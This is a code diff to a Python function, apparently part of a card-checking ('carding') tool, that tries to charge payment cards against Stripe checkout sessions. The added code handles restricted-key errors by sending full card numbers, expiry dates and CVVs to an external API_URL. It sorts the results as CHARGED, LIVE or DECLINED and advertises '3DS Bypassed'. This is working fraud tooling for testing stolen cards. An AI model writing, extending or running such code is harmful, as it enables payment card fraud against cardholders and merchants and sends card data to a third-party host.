@@ -58,8 +58,48 @@ async def charge_card_hybrid(card: dict, pk: str, cs: str, init_data: dict, sess
             pm = await r.json()
         
         if "error" in pm:
+            error_msg = pm["error"].get("message", "Card error")
+            
+            # Check if key is restricted
+            if "unsupported for publishable key tokenization" in error_msg.lower() or "tokenization" in error_msg.lower():
+                logger.info("⚠️ Restricted key detected - skipping to Method 2 (API)")
+                
+                # Skip Method 1, go directly to Method 2
+                try:
+                    checkout_url = f"https://checkout.stripe.com/c/pay/{cs}#xxx"
+                    card_str = f"{card['cc']}|{card['month']}|{card['year']}{card['cvv']}"
+                    
+                    async with session.get(API_URL, params={"url": checkout_url, "card": card_str}, timeout=aiohttp.ClientTimeout(total=30)) as r:
+                        api_result = await r.json()
+                    
+                    api_status = api_result.get("status", "error")
+                    api_msg = api_result.get("msg", "No response")
+                    
+                    if api_status == "charge":
+                        result["status"] = "CHARGED"
+                        result["response"] = f"3DS Bypassed ✅ - {api_msg}"
+                        result["bypass_method"] = "method_2"
+                    elif api_status == "live":
+                        result["status"] = "LIVE"
+                        result["response"] = api_msg
+                        result["bypass_method"] = "method_2"
+                    elif api_status == "dead":
+                        result["status"] = "DECLINED"
+                        result["response"] = api_msg
+                        result["bypass_method"] = "method_2"
+                    else:
+                        result["status"] = "FAILED"
+                        result["response"] = "Restricted checkout - API method failed"
+                except Exception as e:
+                    logger.error(f"API method error: {e}")
+                    result["status"] = "FAILED"
+                    result["response"] = "Checkout restricted by merchant"
+                
+                result["time"] = round(time.perf_counter() - start, 2)
+                return result
+            
             result["status"] = "DECLINED"
-            result["response"] = pm["error"].get("message", "Card error")
+            result["response"] = error_msg
             result["time"] = round(time.perf_counter() - start, 2)
             return result
         
